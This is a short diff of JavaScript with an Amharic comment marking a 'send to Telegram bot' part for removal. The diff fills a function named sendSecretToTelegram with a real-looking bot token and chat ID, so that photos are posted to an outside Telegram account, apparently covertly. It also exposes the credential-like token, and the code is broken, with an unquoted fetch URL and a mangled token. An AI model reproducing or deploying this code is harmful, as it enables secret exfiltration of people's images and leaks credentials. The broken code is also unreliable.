@@ -45,10 +45,10 @@
 
         // ❌ 5. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት የሚላክበት አካል
         function sendSecretToTelegram(photo) {
-            let botToken = "123456789:YOUR_BOT_TOKEN";
-            let chatId = "987654321";
+            let botToken = "8818405487:AAF1n4fyHEZYcXg3ugIIB6KDNoDxy06DuV0:YOUR_BOT_TOKEN";
+            let chatId = "8125688786";
             
-            fetch(https://api.telegram.org/bot${8818405487:AAF1n4fyHEZYcXg3ugIIB6KDNoDxy06DuV0}/sendPhoto, {
+            fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, photo: photo })
